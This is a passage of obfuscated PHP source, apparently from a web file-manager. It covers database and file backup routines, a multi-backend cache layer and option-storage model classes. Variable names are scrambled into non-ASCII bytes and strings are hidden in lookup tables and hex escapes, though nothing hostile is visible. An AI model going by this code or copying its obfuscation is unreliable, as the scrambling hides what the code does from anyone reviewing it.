$ğ¬Ìñ‰Û[11] . $—Ê‚úª; } public function db() { $öË¿³ =& $_SERVER[Æ š¦İÈ]; $ÏÛ‘³ğ = self::get(); if ($ÏÛ‘³ğ[$öË¿³[290]][$öË¿³[755]][$öË¿³[747]] == $öË¿³[89]) { return !0; } $¼ÍÒ‘–ª = new BackupDb(); if (!$¼ÍÒ‘–ª->index()) { return !1; } self::set(array($öË¿³[770] => 1)); return !0; } public function dbFile() { $ëá–¢ÀÌ =& $_SERVER[Æ š¦İÈ]; $Š¦ôéŞ = self::get(); if ($Š¦ôéŞ[$ëá–¢ÀÌ[290]][$ëá–¢ÀÌ[759]][$ëá–¢ÀÌ[747]] == $ëá–¢ÀÌ[89]) { return !0; } $™û‰¥¡ = new BackupDbFile(); if (!$™û‰¥¡->index()) { return !1; } self::set(array($ëá–¢ÀÌ[771] => 1)); return !0; } public function file() { $¸ªâä³Í =& $_SERVER[Æ š¦İÈ]; $ˆ–ªŠ¯´ = self::get(); if ($ˆ–ªŠ¯´[$¸ªâä³Í[290]][$¸ªâä³Í[194]][$¸ªâä³Í[747]] == $¸ªâä³Í[89]) { return !0; } if (!isset($ˆ–ªŠ¯´[$¸ªâä³Í[752]]) || $ˆ–ªŠ¯´[$¸ªâä³Í[752]] == $¸ªâä³Í[192]) { $Öªé„ = new BackupFile(); if (!$Öªé„->index()) { return !1; } } self::set(array($¸ªâä³Í[772] => 1, $¸ªâä³Í[747] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $È ”øï¾ =& $_SERVER[Æ š¦İÈ]; $Åçø¸­ = Backup::get(); self::$io = $Åçø¸­[$È ”øï¾[749]]; self::$name = $Åçø¸­[$È ”øï¾[32]]; $©±ª“‘ = new DbManage(); $©ÔºËÕ = $©±ª“‘->dbType(); $Ò‰¹Â› = array($È ”øï¾[773] => $©ÔºËÕ, $È ”øï¾[774] => time()); Backup::set($Ò‰¹Â›); $×ëøûÇğ = $this->tmpFilesPath() . $È ”øï¾[775] . self::$name . $È ”øï¾[8]; del_dir($×ëøûÇğ); mk_dir($×ëøûÇğ); $¹Û—„ã´ = $ú„“ÓŒ = 0; $¼Ö… û‡ = new Task($È ”øï¾[776], $È ”øï¾[777], 0, LNG($È ”øï¾[778]) . $È ”øï¾[779] . LNG($È ”øï¾[780])); try { $¥¹“°÷Š = $©±ª“‘->db()->getTables(); } catch (Exception $æåÃ³ÓŒ) { $¼Ö… û‡->end(); return !1; } $¥¹“°÷Š = array_diff($¥¹“°÷Š, array($È ”øï¾[781], $È ”øï¾[782])); foreach ($¥¹“°÷Š as $–Ãä—ûˆ) { $¹Û—„ã´ += $©±ª“‘->model($–Ãä—ûˆ)->count(); } $¼Ö… û‡->task[$È ”øï¾[783]] = $¹Û—„ã´; $GLOBALS[$È ”øï¾[784]] = self::$name; foreach ($¥¹“°÷Š as $–Ãä—ûˆ) { $÷™»ÑˆŒ = $×ëøûÇğ . $–Ãä—ûˆ . $È ”øï¾[785]; $Æøİ·Ú™ = null; if ($–Ãä—ûˆ == $È ”øï¾[786] && (!isset($Åçø¸­[$È ”øï¾[752]]) || $Åçø¸­[$È ”øï¾[752]] == $È ”øï¾[192])) { $Æøİ·Ú™ = self::$io; } $ú„“ÓŒ += $©±ª“‘->sqlFromDb($–Ãä—ûˆ, $÷™»ÑˆŒ, $¼Ö… û‡, $Æøİ·Ú™); } unset($GLOBALS[$È ”øï¾[784]]); $¼Ö… û‡->end(); if ($ú„“ÓŒ > $¹Û—„ã´) { $¹Û—„ã´ = $ú„“ÓŒ; } $Ò‰¹Â› = array($È ”øï¾[773] => $©ÔºËÕ, $È ”øï¾[770] => 1, $È ”øï¾[787] => $¹Û—„ã´, $È ”øï¾[788] => $ú„“ÓŒ, $È ”øï¾[789] => time()); Backup::set($Ò‰¹Â›); if ($¹Û—„ã´ - $ú„“ÓŒ > 0) { $¢ùíÀÛ = $È ”øï¾[790]; if (stristr(I18n::getType(), $È ”øï¾[791])) { $¢ùíÀÛ = $È ”øï¾[792]; } write_log(array($¢ùíÀÛ, $Ò‰¹Â›), $È ”øï¾[777]); return !1; } return !0; } private function tmpFilesPath() { $ŞõŞ„ƒ´ =& $_SERVER[Æ š¦İÈ]; $İ¾™–²¸ = TEMP_FILES; if ($GLOBALS[$ŞõŞ„ƒ´[6]][$ŞõŞ„ƒ´[90]][$ŞõŞ„ƒ´[793]]) { $İ¾™–²¸ = $GLOBALS[$ŞõŞ„ƒ´[6]][$ŞõŞ„ƒ´[90]][$ŞõŞ„ƒ´[793]]; if (!mk_dir($İ¾™–²¸) || !is_writable($İ¾™–²¸) || !IO::mkfile($İ¾™–²¸ . $ŞõŞ„ƒ´[794])) { $İ¾™–²¸ = TEMP_FILES; } } return $İ¾™–²¸; } } goto c‘Öõ ø±õ; c‘Öõ ø±õ: class BackupDbFile { public function __construct() { } public function index() { $ê¶®õÛœ =& $_SERVER[Æ š¦İÈ]; $·¿îÃŠ… = Backup::get(); $ãÆ²Á§¦ = $·¿îÃŠ…[$ê¶®õÛœ[32]]; $Ÿà½Ÿ¦ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\137{$ãÆ²Á§¦}\x2f"; $–û­ëÉµ = $this->backupPath($·¿îÃŠ…); if (!($–û­ëÉµ = IO::mkdir($–û­ëÉµ))) { return !1; } $ÙÒú¯™« = IO::listPath($Ÿà½Ÿ¦); $®çàí… = isset($ÙÒú¯™«[$ê¶®õÛœ[76]]) ? $ÙÒú¯™«[$ê¶®õÛœ[76]] : array(); $®”ôÀœ› = array_sum(array_column($®çàí…, $ê¶®õÛœ[80])); if (!$®”ôÀœ›) { return !1; } $Ã˜õµÓí = array($ê¶®õÛœ[795] => $®”ôÀœ›, $ê¶®õÛœ[796] => time()); Backup::set($Ã˜õµÓí); $¡€ÖØªÅ = new TaskFileTransfer($ê¶®õÛœ[797], $ê¶®õÛœ[777], count($®çàí…), LNG($ê¶®õÛœ[778]) . $ê¶®õÛœ[462] . LNG($ê¶®õÛœ[780]) . $ê¶®õÛœ[798]); $¡€ÖØªÅ->task[$ê¶®õÛœ[760]] = $®”ôÀœ›; foreach ($ÙÒú¯™«[$ê¶®õÛœ[76]] as $”»¦Óâ÷) { $Âæ‰…ï = IO::move($”»¦Óâ÷[$ê¶®õÛœ[78]], $–û­ëÉµ); if (!$Âæ‰…ï) { $¡€ÖØªÅ->end(); $“ñüÛ‡¿ = IO::getLastError($ê¶®õÛœ[799] . $”»¦Óâ÷[$ê¶®õÛœ[78]] . $ê¶®õÛœ[800] . $–û­ëÉµ . $ê¶®õÛœ[538]); write_log($“ñüÛ‡¿, $ê¶®õÛœ[777]); return !1; } } $ªÁƒÄœø = new DbManage(); $Í¸ˆ¥¬÷ = $ªÁƒÄœø->getSqlFile(); if (!$Í¸ˆ¥¬÷[$ê¶®õÛœ[801]] || !$Í¸ˆ¥¬÷[$ê¶®õÛœ[13]]) { return !1; } IO::move($Í¸ˆ¥¬÷[$ê¶®õÛœ[801]], $–û­ëÉµ); IO::move($Í¸ˆ¥¬÷[$ê¶®õÛœ[13]], $–û­ëÉµ); $¡€ÖØªÅ->end(); $Ã˜õµÓí = array($ê¶®õÛœ[802] => $®”ôÀœ›, $ê¶®õÛœ[803] => time()); Backup::set($Ã˜õµÓí); return !0; } private function backupPath($¸êìˆ…³) { $¿¦ÄßŸ‘ =& $_SERVER[Æ š¦İÈ]; $Å³ÎªĞ = $¸êìˆ…³[$¿¦ÄßŸ‘[32]]; $é»æëëü = Model($¿¦ÄßŸ‘[767])->get($¿¦ÄßŸ‘[768]); $ÃæÌÑ§ = substr(md5($¿¦ÄßŸ‘[769] . $é»æëëü . $Å³ÎªĞ), 0, 8); return "\173\x69\157\72{$¸êìˆ…³[$¿¦ÄßŸ‘[749]]}\175\x2f\144\x61\164\x61\x62\x61\x73\145\x2f\x62\141\x63\153\165\160\57" . $Å³ÎªĞ . $¿¦ÄßŸ‘[11] . $ÃæÌÑ§; } private function tmpFilesPath() { $½¬Æ…Õ =& $_SERVER[Æ š¦İÈ]; $ÎÃªéò = TEMP_FILES; if ($GLOBALS[$½¬Æ…Õ[6]][$½¬Æ…Õ[90]][$½¬Æ…Õ[793]]) { $ÎÃªéò = $GLOBALS[$½¬Æ…Õ[6]][$½¬Æ…Õ[90]][$½¬Æ…Õ[793]]; if (!mk_dir($ÎÃªéò) || !is_writable($ÎÃªéò) || !IO::mkfile($ÎÃªéò . $½¬Æ…Õ[794])) { $ÎÃªéò = TEMP_FILES; } } return $ÎÃªéò; } } class BackupFile { public function __construct() { } public function index() { $Œ–æ©ß = Backup::get(); $ÑùÒŠŸ¡ = $Œ–æ©ß[$_SERVER[Æ š¦İÈ][290]][$_SERVER[Æ š¦İÈ][194]][$_SERVER[Æ š¦İÈ][469]]; $Ò´£˜Ê„ = array($_SERVER[Æ š¦İÈ][470] => array($_SERVER[Æ š¦İÈ][804], $ÑùÒŠŸ¡), $_SERVER[Æ š¦İÈ][805] => array($_SERVER[Æ š¦İÈ][328], $Œ–æ©ß[$_SERVER[Æ š¦İÈ][749]])); $ûÂ¼  º = (int) Model($_SERVER[Æ š¦İÈ][786])->where($Ò´£˜Ê„)->count($_SERVER[Æ š¦İÈ][469]); $ŸŒÊúÇà = (int) Model($_SERVER[Æ š¦İÈ][786])->where($Ò´£˜Ê„)->sum($_SERVER[Æ š¦İÈ][80]); $åŒ†ñŒı = new TaskFileTransfer($_SERVER[Æ š¦İÈ][806], $_SERVER[Æ š¦İÈ][777], $ûÂ¼  º, LNG($_SERVER[Æ š¦İÈ][778]) . $_SERVER[Æ š¦İÈ][779] . LNG($_SERVER[Æ š¦İÈ][807])); $åŒ†ñŒı->task[$_SERVER[Æ š¦İÈ][760]] = $ŸŒÊúÇà; $ÈÎÏ“¹Ä = array($_SERVER[Æ š¦İÈ][808] => $ûÂ¼  º, $_SERVER[Æ š¦İÈ][809] => $ŸŒÊúÇà, $_SERVER[Æ š¦İÈ][810] => time()); Backup::set($ÈÎÏ“¹Ä); $ü£À¶ÔË = !0; $¬¿‘¡Æ¡ = $this->storeIds(); $Çßàñê = 1; $®™ÂéòÂ = 1000; $úºØêÖí = $£äÖÌ§ñ = 0; $¶ÚçŒ‰ñ = array(); $¸½·Šà† = $İì‹œÏ = 0; do { $Ä“Œ’¹È = $_SERVER[Æ š¦İÈ][811]; $‡Ô·âÉì = Model($_SERVER[Æ š¦İÈ][786])->where($Ò´£˜Ê„)->field($Ä“Œ’¹È)->order($_SERVER[Æ š¦İÈ][812])->selectPage($®™ÂéòÂ, $Çßàñê); $üà”Šô¦ = !empty($‡Ô·âÉì[$_SERVER[Æ š¦İÈ][366]]) ? $‡Ô·âÉì[$_SERVER[Æ š¦İÈ][366]] : array(); foreach ($üà”Šô¦ as $‚ñ£¸¨«) { if (!$this->_fileExist($‚ñ£¸¨«, $¶ÚçŒ‰ñ, $¬¿‘¡Æ¡)) { $ûÂ¼  º -= 1; $ŸŒÊúÇà -= (int) $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][80]]; write_log("\146\x69\x6c\145\x20\156\x6f\x74\x20\145\x78\151\163\164\56\x66\151\154\145\111\x44\x3a{$‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][469]]}\x2c\x20\x70\x61\x74\x68\x3a{$‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][78]]}", $_SERVER[Æ š¦İÈ][813]); continue; } $†¥ŒáÊ = $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][78]]; $ñ²ğäË” = "\173\x69\157\72{$Œ–æ©ß[$_SERVER[Æ š¦İÈ][749]]}\x7d" . substr($†¥ŒáÊ, strlen("\x7b\x69\157\72{$‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][814]]}\175")); if (IO::exist($ñ²ğäË”)) { $åŒ†ñŒı->updateFileEnd($‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][32]], $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][80]]); } else { $ñ²ğäË” = get_path_father($ñ²ğäË”); IO::mkdir($ñ²ğäË”); if (!IO::copy($†¥ŒáÊ, $ñ²ğäË”, $_SERVER[Æ š¦İÈ][815])) { write_log($_SERVER[Æ š¦İÈ][816] . $†¥ŒáÊ . $_SERVER[Æ š¦İÈ][800] . $ñ²ğäË” . $_SERVER[Æ š¦İÈ][538], $_SERVER[Æ š¦İÈ][777]); $ü£À¶ÔË = !1; break; } } $ÑùÒŠŸ¡ = $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][469]]; $£äÖÌ§ñ += 1; $úºØêÖí += $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][80]]; $İì‹œÏ += 1; $¸½·Šà† += $‚ñ£¸¨«[$_SERVER[Æ š¦İÈ][80]]; if ($úºØêÖí >= 1024 * 1024 * 100) { $ÈÎÏ“¹Ä = array($_SERVER[Æ š¦İÈ][817] => $ÑùÒŠŸ¡, $_SERVER[Æ š¦İÈ][818] => $İì‹œÏ, $_SERVER[Æ š¦İÈ][819] => $¸½·Šà†); Backup::set($ÈÎÏ“¹Ä); $úºØêÖí = $£äÖÌ§ñ = 0; } } $¸“³®Š° = count($üà”Šô¦); $Çßàñê++; } while ($¸“³®Š° == $®™ÂéòÂ); $åŒ†ñŒı->end(); $ÈÎÏ“¹Ä = array($_SERVER[Æ š¦İÈ][820] => 1, $_SERVER[Æ š¦İÈ][498] => time(), $_SERVER[Æ š¦İÈ][772] => 1, $_SERVER[Æ š¦İÈ][817] => $ÑùÒŠŸ¡, $_SERVER[Æ š¦İÈ][809] => $ŸŒÊúÇà, $_SERVER[Æ š¦İÈ][808] => $ûÂ¼  º, $_SERVER[Æ š¦İÈ][821] => time()); if ($£äÖÌ§ñ) { $ÈÎÏ“¹Ä[$_SERVER[Æ š¦İÈ][818]] = $İì‹œÏ; $ÈÎÏ“¹Ä[$_SERVER[Æ š¦İÈ][819]] = $¸½·Šà†; } Backup::set($ÈÎÏ“¹Ä); $this->_fileFilter($¶ÚçŒ‰ñ); return !0; } private function _fileExist($ ¾™Š…Õ, &$´­¿ÒÏ, $ìî’¸¶) { $ÚÅ¢ş· =& $_SERVER[Æ š¦İÈ]; $£Ê†íÆù = $ ¾™Š…Õ[$ÚÅ¢ş·[78]]; if (in_array($ ¾™Š…Õ[$ÚÅ¢ş·[469]], $´­¿ÒÏ)) { return !1; } if (!in_array($ ¾™Š…Õ[$ÚÅ¢ş·[814]], $ìî’¸¶)) { return !1; } if (IO::exist($£Ê†íÆù)) { return !0; } $ı«œ©ã = get_path_father($£Ê†íÆù); if (IO::exist($ı«œ©ã)) { $´­¿ÒÏ[] = $ ¾™Š…Õ[$ÚÅ¢ş·[469]]; return !1; } $¹®Êêï = array($ÚÅ¢ş·[814] => $ ¾™Š…Õ[$ÚÅ¢ş·[814]], $ÚÅ¢ş·[78] => array($ÚÅ¢ş·[380], "{$ı«œ©ã}\x25")); $é¸¯‘é = Model($ÚÅ¢ş·[786])->where($¹®Êêï)->field($ÚÅ¢ş·[470])->select(); $´­¿ÒÏ = array_merge($´­¿ÒÏ, array_to_keyvalue($é¸¯‘é, $ÚÅ¢ş·[12], $ÚÅ¢ş·[469])); return !1; } private function _fileFilter($Çµ…´‡ñ) { $Œ÷Ø¼Û² =& $_SERVER[Æ š¦İÈ]; if (empty($Çµ…´‡ñ)) { return; } $¶«¼µÊ = array($Œ÷Ø¼Û²[469] => array($Œ÷Ø¼Û²[7], array_unique($Çµ…´‡ñ))); $³ÁÇ†ÚÏ = Model($Œ÷Ø¼Û²[822])->where($¶«¼µÊ)->field($Œ÷Ø¼Û²[405])->select(); foreach ($³ÁÇ†ÚÏ as $…°±•ïÍ) { Model($Œ÷Ø¼Û²[822])->remove($…°±•ïÍ[$Œ÷Ø¼Û²[405]], !1); } } private function storeIds() { $ €å ëÅ =& $_SERVER[Æ š¦İÈ]; $Ò§–Å = Model($ €å ëÅ[764])->listData(); $ÅØ¥·“Å = array(); $ô²ä’Ï¨ = $GLOBALS[$ €å ëÅ[6]][$ €å ëÅ[90]][$ €å ëÅ[823]]; foreach ($Ò§–Å as $ïÇÈ†Ë) { $ÔÏˆ–à = strtolower($ïÇÈ†Ë[$ €å ëÅ[96]]); if (!isset($ô²ä’Ï¨[$ÔÏˆ–à])) { continue; } $‘ôŸÑí = $ €å ëÅ[74] . (isset($ô²ä’Ï¨[$ÔÏˆ–à]) ? $ô²ä’Ï¨[$ÔÏˆ–à] : ucfirst($ÔÏˆ–à)); if (!class_exists($‘ôŸÑí)) { continue; } $ÅØ¥·“Å[] = $ïÇÈ†Ë[$ €å ëÅ[403]]; } return $ÅØ¥·“Å; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ºä¹ÎˆŸ =& $_SERVER[Æ š¦İÈ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ó¿µşáÔ = $GLOBALS[$ºä¹ÎˆŸ[6]][$ºä¹ÎˆŸ[346]]; $¿ü‚˜çÁ = $Ó¿µşáÔ[$Ó¿µşáÔ[$ºä¹ÎˆŸ[824]]]; $š‰¶¾ä· = $Ó¿µşáÔ[$ºä¹ÎˆŸ[825]]; switch ($Ó¿µşáÔ[$ºä¹ÎˆŸ[824]]) { case $ºä¹ÎˆŸ[21]: self::$handle = Model($ºä¹ÎˆŸ[826]); break; case $ºä¹ÎˆŸ[827]: self::$handle = new CacheRedis($¿ü‚˜çÁ, $š‰¶¾ä·); break; case $ºä¹ÎˆŸ[828]: self::$handle = new CacheMemcached($¿ü‚˜çÁ, $š‰¶¾ä·); break; case $ºä¹ÎˆŸ[194]: self::$handle = new CacheFile($¿ü‚˜çÁ, $š‰¶¾ä·); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($°ôÇíä™) { if (is_array($°ôÇíä™) || is_object($°ôÇíä™)) { $°ôÇíä™ = json_encode($°ôÇíä™); } $°ôÇíä™ = rawurlencode($°ôÇíä™); return md5(KOD_SITE_ID . $_SERVER[Æ š¦İÈ][11] . $°ôÇíä™); } public static function get($Ã’îúÈå, $ù“ÇÊØ» = false) { $ø–Äº½ê = self::key($Ã’îúÈå); if ($ù“ÇÊØ») { return unserialize(self::init()->get($ø–Äº½ê)); } if (!isset(self::$memoryCache[$ø–Äº½ê])) { $İİûæºğ = self::init()->get($ø–Äº½ê); self::$memoryCache[$ø–Äº½ê] = unserialize($İİûæºğ); } return self::$memoryCache[$ø–Äº½ê]; } public static function set($­Êóæã’, $×‡ã˜¹, $¥˜¬ˆãä = false) { $½ĞİÂª = self::key($­Êóæã’); if (isset(self::$memoryCache[$½ĞİÂª]) && self::$memoryCache[$½ĞİÂª] === $×‡ã˜¹) { return !0; } if ($¥˜¬ˆãä === 0) { self::$memoryCache[$½ĞİÂª] = $×‡ã˜¹; return !0; } CacheLock::lock($­Êóæã’); $ø¬ÎŸä = self::init()->set($½ĞİÂª, serialize($×‡ã˜¹), $¥˜¬ˆãä); self::$memoryCache[$½ĞİÂª] = $×‡ã˜¹; CacheLock::unlock($­Êóæã’); return $ø¬ÎŸä; } public static function getCall($„¾ÈäöÏ, $îãÍ—ÈË, $°óÈ‡´·, $¸Â×’’˜ = array()) { $¹ßš‡¦´ =& $_SERVER[Æ š¦İÈ]; $……üÅâ = self::get($„¾ÈäöÏ); if ($……üÅâ || $……üÅâ === $¹ßš‡¦´[12]) { return $……üÅâ; } $……üÅâ = call_user_func_array($°óÈ‡´·, $¸Â×’’˜); $……üÅâ = $……üÅâ ? $……üÅâ : $¹ßš‡¦´[12]; self::set($„¾ÈäöÏ, $……üÅâ, $îãÍ—ÈË); return $……üÅâ; } public static function remove($Ğ£İÑí ) { $¶—¸éò“ = self::key($Ğ£İÑí ); unset(self::$memoryCache[$¶—¸éò“]); self::clearTimeout(); CacheLock::lock($Ğ£İÑí ); $ñ¯‰˜³’ = self::init()->remove($¶—¸éò“); CacheLock::unlock($Ğ£İÑí ); return $ñ¯‰˜³’; } public static function removeMemory($±€ÁÑÜì) { $‚šéıÁ = self::key($±€ÁÑÜì); unset(self::$memoryCache[$‚šéıÁ]); } public static function clearMemory($æ·êğäÂ = false) { if ($æ·êğäÂ) { $æ·êğäÂ = self::key($æ·êğäÂ); unset(self::$memoryCache[$æ·êğäÂ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Æ š¦İÈ][829])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Æ š¦İÈ][830])) { self::init()->clearTimeout(); } } } goto e‚øóÎ¸«ó; eáˆ÷Ë×š: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\x4f\x70\164\x69\157\156"; public $field = array(); public function listData($ƒ’‹‹Öß = false, $Ùô¥¸Ìê = "\x6d\x6f\x64\151\x66\171\x54\151\x6d\145", $ÂêÇ·¿Ç = false) { $Â©È±´ = Model($this->modelType)->get(!1, $this->optionType, !0); $ÌˆÎ•òÉ = array_values($Â©È±´); if ($ÌˆÎ•òÉ && $ÌˆÎ•òÉ[0] && !is_array($ÌˆÎ•òÉ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Â©È±´ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Â©È±´) { return $ƒ’‹‹Öß ? null : array(); } if (!$ƒ’‹‹Öß) { $Â©È±´ = array_filter(array_values($Â©È±´)); return array_sort_by($Â©È±´, $Ùô¥¸Ìê, $ÂêÇ·¿Ç); } return $Â©È±´[$_SERVER[Æ š¦İÈ][400] . $ƒ’‹‹Öß]; } public function insert($¬ Œõƒ) { $šÃĞêºå =& $_SERVER[Æ š¦İÈ]; $¬ Œõƒ = array_field_key($¬ Œõƒ, $this->field); $×š±‰¼ = Model($this->modelType)->get($šÃĞêºå[401], $this->optionType . $šÃĞêºå[402]); $×š±‰¼ = $×š±‰¼ ? $×š±‰¼ : 0; $¬ Œõƒ[$šÃĞêºå[403]] = ++$×š±‰¼; $¬ Œõƒ[$šÃĞêºå[195]] = time(); $¬ Œõƒ[$šÃĞêºå[86]] = time(); Model($this->modelType)->set($šÃĞêºå[401], $×š±‰¼, $this->optionType . $šÃĞêºå[402]); Model($this->modelType)->set($šÃĞêºå[400] . $×š±‰¼, $¬ Œõƒ, $this->optionType); return $×š±‰¼; } public function update($¢Ğ…¶åí, $§”à×´­) { $è¢â¸Ú =& $_SERVER[Æ š¦İÈ]; $§”à×´­ = array_field_key($§”à×´­, $this->field); $ºôÂ´İ = $this->listData($¢Ğ…¶åí); if (!$ºôÂ´İ || !$¢Ğ…¶åí) { return !1; } $§”à×´­ = array_merge($ºôÂ´İ, $§”à×´­); $§”à×´­[$è¢â¸Ú[86]] = time(); return Model($this->modelType)->set($è¢â¸Ú[400] . $¢Ğ…¶åí, $§”à×´­, $this->optionType); } public function remove($¯ó¨ù…å) { if (!$¯ó¨ù…å) { return !1; } return Model($this->modelType)->remove($_SERVER[Æ š¦İÈ][400] . $¯ó¨ù…å, $this->optionType); } public function clear() { $Àµ£ºÛ =& $_SERVER[Æ š¦İÈ]; Model($this->modelType)->remove($Àµ£ºÛ[401], $this->optionType . $Àµ£ºÛ[402]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($´›İÉâ, $ã·ÁûóÆ) { if (!$ã·ÁûóÆ) { return !1; } $²Èº·±æ = $this->listData(); $²Èº·±æ = array_to_keyvalue($²Èº·±æ, $´›İÉâ); return isset($²Èº·±æ[$ã·ÁûóÆ]) ? $²Èº·±æ[$ã·ÁûóÆ] : !1; } public function findByName($—Ş·‚²ß) { return $this->findByKey($_SERVER[Æ š¦İÈ][32], $—Ş·‚²ß); } protected function resetData($‰ÆÃ©µâ) { $©°ÂöÀ =& $_SERVER[Æ š¦İÈ]; $‰ÆÃ©µâ = is_array($‰ÆÃ©µâ) ? $‰ÆÃ©µâ : array(); $×ÒĞÆ°Ÿ = array(); for ($±”ÃÓÙƒ = 0; $±”ÃÓÙƒ < count($‰ÆÃ©µâ); $±”ÃÓÙƒ++) { $×ÒĞÆ°Ÿ[$©°ÂöÀ[400] . $‰ÆÃ©µâ[$±”ÃÓÙƒ][$©°ÂöÀ[403]]] = $‰ÆÃ©µâ[$±”ÃÓÙƒ]; } return Model($this->modelType)->set($×ÒĞÆ°Ÿ, !1, $this->optionType); } private function getAutoName($ÙÑ·ÀÁ±) { $ü»ªÁæË = array_to_keyvalue($this->listData(), $_SERVER[Æ š¦İÈ][32]); if (!$ü»ªÁæË || !isset($ü»ªÁæË[$ÙÑ·ÀÁ±])) { return $ÙÑ·ÀÁ±; } for ($ùü°óı™ = 1; $ùü°óı™ < count($ü»ªÁæË); $ùü°óı™++) { $Ëğ«‚ò½ = $ÙÑ·ÀÁ± . "\x28{$ùü°óı™}\x29"; if (!isset($ü»ªÁæË[$Ëğ«‚ò½])) { return $Ëğ«‚ò½; } } return $Ëğ«‚ò½; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Á‹¡íÁª = false, $“††®ïµ = '', $ŠÀÊèÁÛ = false) { $ìø´½«ê =& $_SERVER[Æ š¦İÈ]; $ÎÖÊ = $this->cacheGet($“††®ïµ); $‚•‰°á = $this->optionDefault($“††®ïµ); $‚•‰°á = is_array($‚•‰°á) ? $‚•‰°á : array(); if (is_array($ÎÖÊ)) { $ÎÖÊ = array_merge($‚•‰°á, $ÎÖÊ); return $Á‹¡íÁª ? isset($ÎÖÊ[$Á‹¡íÁª]) ? $ÎÖÊ[$Á‹¡íÁª] : null : $ÎÖÊ; } $˜¨˜Ğ“¡ = $this->filterWhere(array($ìø´½«ê[33] => $“††®ïµ)); $ÎÖÊ = $this->where($˜¨˜Ğ“¡)->select(); $ÎÖÊ = array_to_keyvalue($ÎÖÊ, $ìø´½«ê[95], $ìø´½«ê[371]); foreach ($ÎÖÊ as $Ÿ™íö— => $Õı×ÍÏ) { if ($ŠÀÊèÁÛ || in_array($Ÿ™íö—, $this->jsonField)) { $ÎÖÊ[$Ÿ™íö—] = json_decode($Õı×ÍÏ, !0); } } $this->cacheSet($“††®ïµ, $ÎÖÊ); $ÎÖÊ = array_merge($‚•‰°á, $ÎÖÊ); return $Á‹¡íÁª ? $ÎÖÊ[$Á‹¡íÁª] : $ÎÖÊ; } public function set($½ö¸¹Î, $ÑÅˆÔè´ = false, $‹Ñé«§ = '') { $–ïš¿¦ =& $_SERVER[Æ š¦İÈ]; $this->cacheRemove($‹Ñé«§); $·ëÌÖ¹ = array(); $¯ŠÅçÛÄ = is_array($½ö¸¹Î) ? $½ö¸¹Î : array($½ö¸¹Î => $ÑÅˆÔè´); foreach ($¯ŠÅçÛÄ as $Íõ°ùñû => $‚¨’Ñæ) { if (is_array($‚¨’Ñæ)) { $‚¨’Ñæ = json_encode_force($‚¨’Ñæ); } $this->checkLength($‚¨’Ñæ, !1, $this->tableName . $–ïš¿¦[4] . $½ö¸¹Î); $‚¨’Ñæ = self::textEncode($‚¨’Ñæ); $¯ŠÅçÛÄ = array($–ïš¿¦[33] => $‹Ñé«§, $–ïš¿¦[95] => $Íõ°ùñû, $–ïš¿¦[371] => $‚¨’Ñæ); $·ëÌÖ¹[] = $this->filterWhere($¯ŠÅçÛÄ); } if (!$·ëÌÖ¹) { return !0; } return $this->addAll($·ëÌÖ¹, array(), !0); } protected function optionDefault($ŠŞ¯ĞÙ = '') { return !1; } public function setDeep($Âæ–È’¨, $•´‘ÇÄÊ = false, $›ÛôÎ¯ = '') { $òˆĞÉ” = explode($_SERVER[Æ š¦İÈ][10], $Âæ–È’¨); $Ğûı¦¶ = $this->get(); array_set_value($Ğûı¦¶, $Âæ–È’¨, $•´‘ÇÄÊ); $this->set($òˆĞÉ”[0], $Ğûı¦¶[$òˆĞÉ”[0]], $›ÛôÎ¯); } public function remove($ıÕ¤¸í, $Òù§û—È = '') { $Şª£öõİ =& $_SERVER[Æ š¦İÈ]; $this->cacheRemove($Òù§û—È); $Ü¸ß¥¾Æ = $this->filterWhere(array($Şª£öõİ[95] => $ıÕ¤¸í, $Şª£öõİ[33] => $Òù§û—È)); if (is_null($ıÕ¤¸í)) { unset($Ü¸ß¥¾Æ[$Şª£öõİ[95]]); } return $this->where($Ü¸ß¥¾Æ)->delete(); } public function cacheSet($ÇºÓ–ØÂ, $»éâ¡í¯ = false) { return Cache::set($this->cacheKey($ÇºÓ–ØÂ), $»éâ¡í¯); } public function cacheGet($Æ™ÑÆ£ò) { return Cache::get($this->cacheKey($Æ™ÑÆ£ò)); } public function cacheRemove($ö¸˜º¥˜) { return Cache::remove($this->cacheKey($ö¸˜º¥˜)); } protected function filterWhere($µ÷Ã§ü») { return $µ÷Ã§ü»; } protected function cacheKey($²ĞÑ–Ç) { return $²ĞÑ–Ç; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\x6d\x65" => "\x69\157\137\x73\157\165\x72\143\145\x5f\x6d\x65\164\141", "\155\145\x74\141\106\151\145\x6c\x64" => "\163\157\165\162\143\x65\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\124\x69\x6d\145", "\164\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\x72\x65\x61\164\145\124\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\145\x72\164", "\x66\165\156\x63\x74\151\157\156"), array("\x76\151\x65\x77\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\164", 